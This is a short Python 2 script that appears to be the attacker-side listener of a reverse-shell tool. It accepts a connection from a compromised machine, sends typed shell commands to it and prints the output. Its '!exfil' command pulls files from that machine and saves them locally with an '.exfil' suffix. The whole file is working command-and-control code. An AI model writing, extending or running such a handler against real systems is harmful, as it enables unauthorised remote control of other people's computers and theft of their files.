#!/usr/bin/python

import socket
import os
from lib.banner import *
from lib.functions import *


#
#
#
def transfer(conn, file):
	f = open(file + '.exfil', 'wb')
	while True:
		bits = conn.recv(1024)
		if 'File not found' in bits:
			print_error("File not found")
			break
		if bits.endswith('!EXFIL'):
			idx = bits.find('!EXFIL')
			f.write(bits[0:idx])
			print_success("Exfil complete")
			break
		else:
			f.write(bits)

	f.close()


#
#
#
def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('localhost', 8080))
	s.listen(1)
	print_info("Listening for connection.")
	conn, addr = s.accept()
	print_success("Connection received from: " + addr[0] + ":" + str(addr[1]))

	while True:
		cmd = raw_input(prompt(addr[0]))

		if '!quit' in cmd:
			conn.send('!quit')
			conn.close()
			break

		elif '!exfil' in cmd:
			exfil,file = cmd.split("!exfil ")
			conn.send(cmd)
			transfer(conn,file)

		else:
			conn.send(cmd)
			print conn.recv(1024)


#
#
#
def main():
	print(srvbanner)
	connect()


#
#
#
main()
